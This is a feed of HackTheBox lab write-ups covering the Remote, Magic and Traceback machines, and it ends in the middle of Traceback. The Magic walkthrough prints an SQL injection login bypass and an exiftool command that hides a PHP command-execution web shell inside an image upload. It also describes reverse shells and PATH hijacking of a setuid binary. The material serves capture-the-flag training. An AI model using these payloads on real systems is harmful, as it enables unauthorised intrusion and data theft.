&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;reg query HKLM /f teamviewer /t REG_SZ /s
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7\
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Images-Remote-regedit.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;decrypting-password-1&quot;&gt;Decrypting Password&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We can decrypt this password using with script python :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Images-Remote-script.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And get administrator password : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!R3m0te!&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Images-Remote-decrypt_password.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;remote-service-winrm-login-and-flag-root&quot;&gt;Remote Service WinRM login and Flag root&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Reference - evil-winrm : &lt;a href=&quot;https://github.com/Hackplayers/evil-winrm&quot;&gt;https://github.com/Hackplayers/evil-winrm&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/remote/HTB-Images-Remote-flag_root.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;trophy&quot;&gt;&lt;strong&gt;&lt;center&gt;Trophy&lt;/center&gt;&lt;/strong&gt;&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;It doesn’t matter how many times you get knocked down. All that matters is you get up one more time than you were knocked down.&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;Roy T. Bennett&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>pcw3r</name></author><category term="HackTheBox" /><category term="Machine" /><category term="WINDOWS" /><category term="EASY" /><category term="ENUMERATION" /><category term="WEB EXPLOITATION" /><category term="SHARE EXPLOITATION" /><category term="PAYLOAD" /><category term="RCE" /><category term="CVE" /><category term="PASSWORD DECRYPT" /><summary type="html">Ref°: HTB-15-Machine</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/images/remote/HTB-Badge-Remote.png" /><media:content medium="image" url="/assets/images/remote/HTB-Badge-Remote.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Write-up Magic Machine</title><link href="/posts/HTB-14-Pentest-Magic/" rel="alternate" type="text/html" title="Write-up Magic Machine" /><published>2020-08-29T15:36:00+02:00</published><updated>2020-08-29T15:36:00+02:00</updated><id>/posts/HTB-14-Pentest-Magic</id><content type="html" xml:base="/posts/HTB-14-Pentest-Magic/">&lt;p&gt;&lt;strong&gt;&lt;center&gt;Ref°: HTB-14-Machine&lt;/center&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;— Magic is a medium level linux machine. It defined by sql injection to bypass the authentication of a login page and the exploitation of payload hidden in an image to gain our “foothold”.&lt;/p&gt;

&lt;p&gt;A lateral movement on the user theseus is possible through a leaked database and the presence in it of a password reused by this user.&lt;/p&gt;

&lt;p&gt;Privilege elevation is achieved by exploiting the sysinfo binary and environment variables.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Information-Magic.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-discovery---figure-out-environment&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[1] Discovery - Figure out environment&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;network-service-scanning&quot;&gt;Network Service Scanning&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Nmap scan reveal 2 services on her usual port :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web&lt;/code&gt; on port 80&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; 10.10.10.185 &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-nmap.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;website&quot;&gt;Website&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We have portfolio website with possibility to see all pictures.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-website.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And the capacity to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upload files&lt;/code&gt; if we success to login.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-login_page.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The login page is vulnerable to SQL Injection and we can bypass the authentication.&lt;/p&gt;

&lt;p&gt;How we know that ?&lt;/p&gt;

&lt;p&gt;Firstly, when we entered fake credential an error appear and present “Wrong Username or Password”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-error_login.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And when we entered only a single quote in to the “Username” field and submitted the request using the “Login” button, the error not appear.&lt;/p&gt;

&lt;p&gt;This show us the website interprets this single quote and had potentially vulnerable to SQL Injection.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-injection_test.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;References - sql injection : &lt;a href=&quot;https://portswigger.net/support/using-sql-injection-to-bypass-authentication&quot;&gt;https://portswigger.net/support/using-sql-injection-to-bypass-authentication&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-foothold---get-into-the-target-&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[2] Foothold - Get into the target &lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;bypassing-authentication-with-sql-injection&quot;&gt;Bypassing Authentication with SQL Injection&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Now, we used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;' or 1=1 -- &lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This causes the application to perform the query:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT * FROM users WHERE username = '' OR 1=1-- ' AND password = 'foo'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Because the comment sequence (–) causes the remainder of the query to be ignored, this is equivalent to:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT * FROM users WHERE username = ' ' OR 1=1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-injection_bypass.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we got it! We able to upload images and gain foothold from this way.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-upload_page.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;obtaining-reverse-shell-with-payload-injection&quot;&gt;Obtaining Reverse Shell with Payload Injection&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;The condition to upload allowed files are only &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JPG, JPEG and PNG&lt;/code&gt; extensions.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-upload_condition.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exiftool&lt;/code&gt; to embed the payload into the picture to bypass this condition.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;exiftool &lt;span class=&quot;nt&quot;&gt;-Comment&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;?php echo &quot;&amp;lt;pre&amp;gt;&quot;; system($_GET[&quot;cmd&quot;]); _halt_compiler() ?&amp;gt;'&lt;/span&gt; minion.jpg
&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;minion.jpg minion.php.jpg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;We need to rename our file to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*.php.jpg&lt;/code&gt; to bypass the restriction. Anyway the file is parsed as a PHP file and our payload is fully functional:&lt;/p&gt;

&lt;p&gt;Upload the file :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-upload_test.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Payload execution :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-exec_payload.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we can use commands to control it with our web browser and leak for example &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwd&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-leak_passwd.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We know the system user to exploit : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;theseus&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;But we must obtain reverse shell to perform lateral movement on this user.&lt;/p&gt;

&lt;p&gt;We use an other PHP payload we can find from : &lt;a href=&quot;https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/&quot;&gt;https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/&lt;/a&gt; and proceed the same way.&lt;/p&gt;

&lt;p&gt;We listening the correct port and get reverse shell by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt; :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-nc_get_www-data.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We gain finally our foothold.&lt;/p&gt;

&lt;h2 id=&quot;3-lateral-movement---move-through-environment&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[3] Lateral Movement - Move through environment&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;plaintext-password-from-database&quot;&gt;Plaintext Password from database&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We have website, the first interesting enumeration we can be realize is on folder &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/*&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Retrieve database information under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;db.php5&lt;/code&gt; file :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;db name : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Magic&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;db host : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;localhost&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;db username : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;theseus&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;db password : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iamkingtheseus&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-info_db.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I find php file to perform backup database on localhost such as for example : &lt;a href=&quot;https://github.com/daniloaz/myphp-backup&quot;&gt;https://github.com/daniloaz/myphp-backup&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We retrieve the PHP file from Magic machine and execute to backup the database &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Magic&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-transfert_backup_php.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-backup_db.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-enum.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We don’t have the rights to retrieve the backup.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-error_get_db.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To bypass this restriction, rename the backup file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sql.gz&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jpg&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-mv_db1.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-grab_db.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once we grab the file, we rename correctly and open the database.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-mv_db2.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The database reveal new password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Th3s3usW4sK1ng&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-db_check.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;reusing-password&quot;&gt;Reusing Password&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;Theseus account reuse the same password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-lateral_movement_theseus.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;flag-user&quot;&gt;Flag user&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-flag_user.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;4-privilege-escalation---gain-higher-level-permissions&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[4] Privilege Escalation - Gain higher-level permissions&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;persistence-with-ssh-authorized-keys&quot;&gt;Persistence with SSH Authorized Keys&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;To proceed more easily, I make my ssh connection more persistent.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-make_ssh_persistent.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-connect_ssh_theseus.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;setuid-path-modification-and-reverse-shell-with-payload-injection&quot;&gt;Setuid, Path Modification and Reverse Shell with Payload Injection&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;The enumeration reveal interesting binary &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sysinfo&lt;/code&gt;. The program run under root privilege but he can be launch by anybody from users group. Our account belongs to this group.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-suid.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This program launch many module like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fdisk&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cpuinfo&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lshw&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We using path variable to escalate our privilege by creating a named file of one of these modules with our bash reverse shell.&lt;/p&gt;

&lt;p&gt;We modify an environment variable in order to make one of the modules run using the following path : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/privuser/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;References - path environment : &lt;a href=&quot;https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/&quot;&gt;https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We listening on our local machine and execute sysinfo program on Magic machine.&lt;/p&gt;

&lt;h3 id=&quot;flag-root&quot;&gt;Flag root&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/magic/HTB-Images-Magic-flag_root.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Magic machine is compromised.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;trophy&quot;&gt;&lt;strong&gt;&lt;center&gt;Trophy&lt;/center&gt;&lt;/strong&gt;&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Any sufficiently advanced technology is indistinguishable from magic.&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;Arthur C. Clarke&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>pcw3r</name></author><category term="HackTheBox" /><category term="Machine" /><category term="LINUX" /><category term="MEDIUM" /><category term="ENUMERATION" /><category term="DATABASE EXPLOITATION" /><category term="SQL INJECTION" /><category term="SUID BINARIES" /><category term="PATH-ENVIRONMENT EXPLOITATION" /><category term="PAYLOAD" /><summary type="html">Ref°: HTB-14-Machine — Magic is a medium level linux machine. It defined by sql injection to bypass the authentication of a login page and the exploitation of payload hidden in an image to gain our “foothold”. A lateral movement on the user theseus is possible through a leaked database and the presence in it of a password reused by this user. Privilege elevation is achieved by exploiting the sysinfo binary and environment variables. [1] Discovery - Figure out environment Network Service Scanning Nmap scan reveal 2 services on her usual port : ssh on port 22 web on port 80 $ nmap -A -T5 10.10.10.185 -p- Website We have portfolio website with possibility to see all pictures. And the capacity to upload files if we success to login. The login page is vulnerable to SQL Injection and we can bypass the authentication. How we know that ? Firstly, when we entered fake credential an error appear and present “Wrong Username or Password”. And when we entered only a single quote in to the “Username” field and submitted the request using the “Login” button, the error not appear. This show us the website interprets this single quote and had potentially vulnerable to SQL Injection. References - sql injection : https://portswigger.net/support/using-sql-injection-to-bypass-authentication [2] Foothold - Get into the target Bypassing Authentication with SQL Injection Now, we used ' or 1=1 -- This causes the application to perform the query: SELECT * FROM users WHERE username = '' OR 1=1-- ' AND password = 'foo' Because the comment sequence (–) causes the remainder of the query to be ignored, this is equivalent to: SELECT * FROM users WHERE username = ' ' OR 1=1 And we got it! We able to upload images and gain foothold from this way. Obtaining Reverse Shell with Payload Injection The condition to upload allowed files are only JPG, JPEG and PNG extensions. We use exiftool to embed the payload into the picture to bypass this condition. $ exiftool -Comment='&amp;lt;?php echo &quot;&amp;lt;pre&amp;gt;&quot;; system($_GET[&quot;cmd&quot;]); _halt_compiler() ?&amp;gt;' minion.jpg $ mv minion.jpg minion.php.jpg We need to rename our file to *.php.jpg to bypass the restriction. Anyway the file is parsed as a PHP file and our payload is fully functional: Upload the file : Payload execution : Now we can use commands to control it with our web browser and leak for example passwd file. We know the system user to exploit : theseus But we must obtain reverse shell to perform lateral movement on this user. We use an other PHP payload we can find from : https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/ and proceed the same way. We listening the correct port and get reverse shell by www-data : We gain finally our foothold. [3] Lateral Movement - Move through environment Plaintext Password from database We have website, the first interesting enumeration we can be realize is on folder /var/www/*. Retrieve database information under db.php5 file : db name : Magic db host : localhost db username : theseus db password : iamkingtheseus I find php file to perform backup database on localhost such as for example : https://github.com/daniloaz/myphp-backup We retrieve the PHP file from Magic machine and execute to backup the database Magic. We don’t have the rights to retrieve the backup. To bypass this restriction, rename the backup file sql.gz to jpg file. Once we grab the file, we rename correctly and open the database. The database reveal new password Th3s3usW4sK1ng. Reusing Password Theseus account reuse the same password. Flag user [4] Privilege Escalation - Gain higher-level permissions Persistence with SSH Authorized Keys To proceed more easily, I make my ssh connection more persistent. Setuid, Path Modification and Reverse Shell with Payload Injection The enumeration reveal interesting binary /bin/sysinfo. The program run under root privilege but he can be launch by anybody from users group. Our account belongs to this group. This program launch many module like fdisk, cpuinfo or lshw. We using path variable to escalate our privilege by creating a named file of one of these modules with our bash reverse shell. We modify an environment variable in order to make one of the modules run using the following path : /tmp/privuser/ References - path environment : https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/ We listening on our local machine and execute sysinfo program on Magic machine. Flag root Magic machine is compromised. Trophy Any sufficiently advanced technology is indistinguishable from magic. Arthur C. Clarke</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/images/magic/HTB-Badge-Magic.png" /><media:content medium="image" url="/assets/images/magic/HTB-Badge-Magic.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Write-up Traceback Machine</title><link href="/posts/HTB-13-Pentest-Traceback/" rel="alternate" type="text/html" title="Write-up Traceback Machine" /><published>2020-08-15T17:00:00+02:00</published><updated>2020-08-15T17:00:00+02:00</updated><id>/posts/HTB-13-Pentest-Traceback</id><content type="html" xml:base="/posts/HTB-13-Pentest-Traceback/">&lt;p&gt;&lt;strong&gt;&lt;center&gt;Ref°: HTB-13-Machine&lt;/center&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;— Traceback is a Linux machine that highlights the exploitation of backdoor (from webshell smevk) present behind a website to gained a foothold. This give us a possibility to enum and find a way to execute lateral movement on user sysadmin through lua script and misconfiguration sudo.&lt;/p&gt;

&lt;p&gt;Scripts in /etc/update-motd.d/* running under root privileges can be write-edited by the user “sysadmin”. This gives the possibility to place  payload and grab a “reverse shell” with root privileges.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Information-Traceback.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-discovery---figure-out-environment&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[1] Discovery - Figure out environment&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;network-service-scanning&quot;&gt;Network Service Scanning&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;The nmap scan reveals &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache&lt;/code&gt; to be running on their usual ports; 22 and 80.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; 10.10.10.181 &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-nmap.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;website-defaced&quot;&gt;Website defaced&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We discover deface site on web service. Apparently &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Xh4H hacker&lt;/code&gt; left a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backdoor&lt;/code&gt;, maybe to exploit it later.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-web.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The hacker left us a hint in the source code by adding as a comment in the html code this : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Some of the best web shells that you might need ;)&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-source.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This hint is a reference of the following webshells from github repository : &lt;a href=&quot;https://github.com/TheBinitGhimire/Web-Shells&quot;&gt;https://github.com/TheBinitGhimire/Web-Shells&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;A &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webshell&lt;/code&gt; is a web security threat, which is a web-based implementation of the shell concept. 
A webshell is able to be uploaded to a web server to allow remote access to the web server, such as the web server’s file system. 
A webshell is unique in that it enables users to access a web server by way of a web browser that acts like a command-line interface.&lt;/p&gt;

&lt;h2 id=&quot;2-foothold---get-into-the-target-&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[2] Foothold - Get into the target &lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;finding-smevk-webshell&quot;&gt;Finding SmEvK Webshell&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;After testing them all, we find the webshell concerned : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SmEvK_PaThAn Shell V3&lt;/code&gt; on http://10.10.10.181/smevk.php&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-webshell.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We success to log-in the webshell with credential mentionned in the source code : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin / admin&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-githubwebshell.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-webshell2.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The exploitation is successful and we have gained a foothold.&lt;/p&gt;

&lt;h2 id=&quot;lateral-movement---move-through-environment&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;Lateral Movement - Move through environment&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;sudo-misconfiguration&quot;&gt;Sudo Misconfiguration&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Enum with webadmin account and check the file /etc/passwd to find an other interesting system user : sysadmin&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-passwd.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;User sysadmin may run the following commands with no password under root privilege &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(ALL) NOPASSWD: /home/sysadmin/luvit&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/traceback/HTB-Images-Traceback-misconfigurationsudo.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

